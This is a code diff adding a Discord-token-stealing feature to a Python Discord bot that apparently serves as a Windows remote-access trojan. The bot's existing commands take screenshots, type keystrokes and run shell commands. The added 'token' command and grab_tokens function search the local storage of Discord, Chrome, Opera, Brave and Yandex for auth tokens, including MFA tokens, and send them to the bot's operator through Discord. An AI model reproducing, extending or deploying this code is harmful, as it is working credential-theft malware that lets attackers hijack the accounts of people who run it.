@@ -1,5 +1,8 @@
+# THIS CODE HAS BEEN CREATED SPECIFICALLY FOR WINDOWS COMPUTERS
+# CERTAIN FUNCTIONS MIGHT NOT WORK ON OTHER SYSTEMS
+
 import subprocess
-import discord, platform, asyncio, tempfile, os, pathlib, pyscreenshot, cv2, aiohttp, win10toast
+import discord, platform, asyncio, tempfile, os, pathlib, pyscreenshot, cv2, aiohttp, win10toast, re
 from discord.ext import commands, tasks
 from keyboard import write
 
@@ -99,6 +102,31 @@ async def type(ctx, text):
     write(text)
     await save_out(ctx, text)
 
+@bot.command(brief="Grabs the Discord token.", description="Looks for the user token in Discord, Chrome, Opera, Brave and Yandex")
+async def token(ctx):
+    local = os.getenv("LOCALAPPDATA")
+    roaming = os.getenv("APPDATA")
+    paths = {
+        "Discord": roaming + "\\Discord", "Discord Canary": roaming + "\\discordcanary",
+        "Discord PTB": roaming + "\\discordptb", "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
+        "Opera": roaming + "\\Opera Software\\Opera Stable", "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    }
+    msg = ""
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        msg += f"\n{platform}:\n\n"
+        tokens = grab_tokens(path)
+        if len(tokens) > 0:
+            for token in tokens:
+                msg += f"{token}\n"
+        else:
+            msg += "No tokens found."
+    if msg[0] == "\n":
+        msg = msg[1:]
+    await save_out(ctx, msg)
+
 async def send_subprocess(ctx, command):
     proc = await asyncio.subprocess.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=subprocess.STDOUT)
     stdout = (await proc.communicate())[0]
@@ -111,5 +139,17 @@ async def save_out(ctx, text):
     file.close()
     await ctx.send(file=discord.File(filename))
     os.remove(filename)
+
+def grab_tokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
 
 bot.run("TOKEN GOES HERE...")
